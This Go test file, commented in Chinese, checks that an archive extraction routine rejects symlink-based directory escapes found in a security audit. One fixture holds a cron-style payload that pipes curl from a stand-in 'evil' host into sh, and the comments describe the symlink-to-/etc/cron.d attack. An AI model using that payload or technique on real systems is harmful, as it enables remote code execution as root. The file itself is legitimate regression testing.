package fileops

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// 解包路径的**真实路径**（软链接）边界必须被拒绝。
//
// 2026-10-01 安全审查的 CRITICAL 发现：safeJoin 以前只做词法检查
//（逐段拒 ".." + Clean 后前缀比较），而实例目录的内容完全由租户控制 ——
// 租户在自己的实例里放一个目录软链接 `d/evil -> /etc/cron.d`，再提交一个含
// 条目 `evil/rce` 的压缩包，词法路径看着仍在实例目录内，实际却由 root 写到
// 了 cron 目录（两个入口都走这条路：解压任务与备份回滚）。
//
// 这条用例锁住两道新增的检查：safeJoin 里的 ResolveWithin（真实路径边界），
// 以及打开文件时的 O_NOFOLLOW（挡"最后一段是软链接"的写法，顺带关掉
// 检查→打开之间的 TOCTOU 窗口）。最后确认正常路径没被误伤。
func TestSafeJoinRejectsSymlinkedDirEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows 上创建软链接需要额外权限，且 Daemon 只发布 Linux 版本")
	}
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	dst := filepath.Join(root, "inst", "d")
	outside := filepath.Join(root, "outside")
	for _, d := range []string{dst, outside} {
		if err := os.MkdirAll(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}

	// 指向实例外目录的软链接：条目名看起来很普通
	if err := os.Symlink(outside, filepath.Join(dst, "evil")); err != nil {
		t.Fatal(err)
	}
	if got, err := safeJoin(dst, "evil/rce"); err == nil {
		t.Errorf("目录软链接逃逸未被拒绝：safeJoin = %q（应报错）", got)
	}

	// 实例内互指的软链接不能误伤（world -> worlds/overworld 是很常见的布局）
	if err := os.MkdirAll(filepath.Join(dst, "real"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("real", filepath.Join(dst, "alias")); err != nil {
		t.Fatal(err)
	}
	if _, err := safeJoin(dst, "alias/x.txt"); err != nil {
		t.Errorf("实例内互指的软链接被误伤：%v", err)
	}
	// 目标还不存在（解出深层新文件）也要放行
	if _, err := safeJoin(dst, "real/new/deep.txt"); err != nil {
		t.Errorf("写入尚不存在的深层文件被误伤：%v", err)
	}
	// 普通路径仍返回 dst 之内的路径
	got, err := safeJoin(dst, "a.txt")
	if err != nil {
		t.Fatalf("普通路径被误伤：%v", err)
	}
	if want := filepath.Join(dst, "a.txt"); got != want {
		t.Errorf("safeJoin = %q，期望 %q", got, want)
	}
}

// 端到端：压缩包里带 `evil/rce`（evil 是实例内指向实例外目录的软链接）时，
// 解包必须失败，且**不能在实例外留下文件**。
func TestExtractRejectsSymlinkedDirEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Daemon 只发布 Linux 版本")
	}
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}

	for _, format := range []string{"zip", "tar.gz"} {
		t.Run(format, func(t *testing.T) {
			arc := filepath.Join(root, "evil"+DefaultExt(format))
			entries := map[string]string{"ok.txt": "fine", "evil/rce": "pwn"}
			if format == "zip" {
				writeZip(t, arc, entries)
			} else {
				writeTarGz(t, arc, entries)
			}

			dst := filepath.Join(root, "out-"+strings.ReplaceAll(format, ".", ""))
			if err := os.MkdirAll(dst, 0o755); err != nil {
				t.Fatal(err)
			}
			// 租户在自己实例里放好的目录软链接
			if err := os.Symlink(outside, filepath.Join(dst, "evil")); err != nil {
				t.Fatal(err)
			}

			err := Extract(context.Background(), arc, dst, format, nil, nil)
			if err == nil {
				t.Fatal("含软链接逃逸条目的压缩包本应解包失败")
			}
			if _, serr := os.Stat(filepath.Join(outside, "rce")); serr == nil {
				t.Error("文件被写到了实例目录之外（root 写穿了软链接）")
			}
		})
	}
}

// 最后一段是软链接的两种写法都要挡住：
//   - 指向**已存在**文件 → safeJoin 的真实路径检查就能发现
//   - **悬空**（目标还不存在）→ 只有 O_NOFOLLOW 挡得住（EvalSymlinks 解析不出
//     悬空链接，会把它当成"还不存在的尾段"接回去）
//
// 第二种正是审计里给出的 PoC 形态：悬空软链接 + 让 root 顺手把目标建出来。
func TestExtractRefusesSymlinkTarget(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Daemon 只发布 Linux 版本（O_NOFOLLOW）")
	}
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}

	// ① 悬空软链接：解包不能把实例外的目标建出来
	dangling := filepath.Join(outside, "atl-x")
	out1 := filepath.Join(root, "out1")
	if err := os.MkdirAll(out1, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(dangling, filepath.Join(out1, "console.log")); err != nil {
		t.Fatal(err)
	}
	arc := filepath.Join(root, "a.tar.gz")
	writeTarGz(t, arc, map[string]string{"console.log": "* * * * * root curl http://evil/p | sh"})
	if err := Extract(context.Background(), arc, out1, "", nil, nil); err == nil {
		t.Fatal("目标是悬空软链接时本应解包失败（否则 root 会替租户建出任意文件）")
	}
	if _, serr := os.Stat(dangling); !os.IsNotExist(serr) {
		t.Error("实例外的文件被以 root 建出来了")
	}

	// ② 指向已存在文件的软链接：目标内容必须原样不动
	victim := filepath.Join(outside, "existing.txt")
	if err := os.WriteFile(victim, []byte("original"), 0o600); err != nil {
		t.Fatal(err)
	}
	out2 := filepath.Join(root, "out2")
	if err := os.MkdirAll(out2, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(victim, filepath.Join(out2, "keep.txt")); err != nil {
		t.Fatal(err)
	}
	arc2 := filepath.Join(root, "b.tar.gz")
	writeTarGz(t, arc2, map[string]string{"keep.txt": "EVIL"})
	if err := Extract(context.Background(), arc2, out2, "", nil, nil); err == nil {
		t.Fatal("目标是软链接时本应解包失败")
	}
	if b, rerr := os.ReadFile(victim); rerr != nil || string(b) != "original" {
		t.Errorf("实例外的文件被覆盖：%q err=%v", string(b), rerr)
	}
}
